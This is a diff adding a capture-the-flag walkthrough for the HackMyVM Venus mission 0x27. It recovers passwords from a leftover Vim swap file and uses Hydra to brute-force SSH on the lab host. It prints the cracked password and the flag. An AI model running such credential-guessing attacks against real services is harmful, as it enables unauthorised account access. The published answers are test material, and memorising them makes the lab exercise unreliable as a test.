@@ -3,10 +3,90 @@ tags: []
 ---
 # Mission 0x27
 
----
-
 ## 🔎 Solution
+After connecting through SSH as *ariel*, the goal is to obtain the password for the next user, *lola*.
+```
+ariel@venus:~$ cat mission.txt 
+################
+# MISSION 0x27 #
+################
 
+## EN ##
+Seems that ariel dont save the password for lola, but there is a temporal file.
+```
+
+In the current directory, there is a `.goas.swp` file. 
+This type of file is typically created by Vim (or Vi) to temporarily store unsaved buffer data, including text, undo history, and editing state.
+```
+ariel@venus:~$ cat .goas.swp 
+k�����}jWD1pad�eb11~teste/goas
+           �������snmk[K;qkBjHcaJqkBjHcaJqkBjHcaJ-->VVjqJGRrnfKmcgD-->bnQgcXYamhSDSff-->QsymOOVbzSaKmRm-->cbjYGSvqAsqIvdg-->LkWReDaaLCMDlLf-->DabEJLmAbOQxEnD-->mYhQVLDKdJrsIwG-->d3LieOzRGX5wud6-->EKvJoTBYlwtwFmv-->PEOppdOkSqJZweH-->rSkPlPhymYcerMJ-->GBUguuSpXVjpxLc-->NdnszvjulNellbK-->IaOpTdAuhSjGZnu-->RGBEMbZHZRgXZnu--rxhKeFKveeKqpwp-->cOXlRYXtJWnVQEG-->ppkJjqYvSCIyAhKThats my little DIc with my old and current passw0rds:
+```
+
+To inspect it more cleanly, the file is transferred to the local machine:
+```
+scp -P 5000 ariel@venus.hackmyvm.eu:/pwned/ariel/.goas.swp .
+```
+
+The file is then recovered using Vim:
+```
+vim -r .goas.swp 
+```
+
+After opening, the recovered content is saved to a readable file:
+```
+:w recovered.txt
+```
+
+The recovered file contains multiple candidate passwords that could belong to *lola*:
+```
+> cat recovered.txt           
+Thats my little DIc with my old and current passw0rds:
+
+-->ppkJjqYvSCIyAhK
+-->cOXlRYXtJWnVQEG
+--rxhKeFKveeKqpwp
+-->RGBEMbZHZRgXZnu
+-->IaOpTdAuhSjGZnu
+-->NdnszvjulNellbK
+-->GBUguuSpXVjpxLc
+-->rSkPlPhymYcerMJ
+-->PEOppdOkSqJZweH
+-->EKvJoTBYlwtwFmv
+-->d3LieOzRGX5wud6
+-->mYhQVLDKdJrsIwG
+-->DabEJLmAbOQxEnD
+-->LkWReDaaLCMDlLf
+-->cbjYGSvqAsqIvdg
+-->QsymOOVbzSaKmRm
+-->bnQgcXYamhSDSff
+-->VVjqJGRrnfKmcgD
+```
+
+To determine which one is valid, Hydra is used to perform a targeted brute-force attempt over SSH. 
+The successful match is:
+```
+> hydra -l lola -P recovered.txt -s 5000 ssh://venus.hackmyvm.eu
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-21 12:10:29
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 18 login tries (l:1/p:18), ~2 tries per task
+[DATA] attacking ssh://venus.hackmyvm.eu:5000/
+[5000][ssh] host: venus.hackmyvm.eu   login: lola   password: d3LieOzRGX5wud6
+1 of 1 target successfully completed, 1 valid password found
+```
+
+Using the discovered credential, the next SSH connection is made:
+```
+ssh lola@venus.hackmyvm.eu -p 5000
+```
+
+Inside the new session, the flag is found:
+```
+lola@venus:~$ cat flagz.txt 
+8===TMYRw853hx8yKRocFMgM===D~~
+```
 
 ## 🚩Flag
-> `
+> `8===TMYRw853hx8yKRocFMgM===D~~`
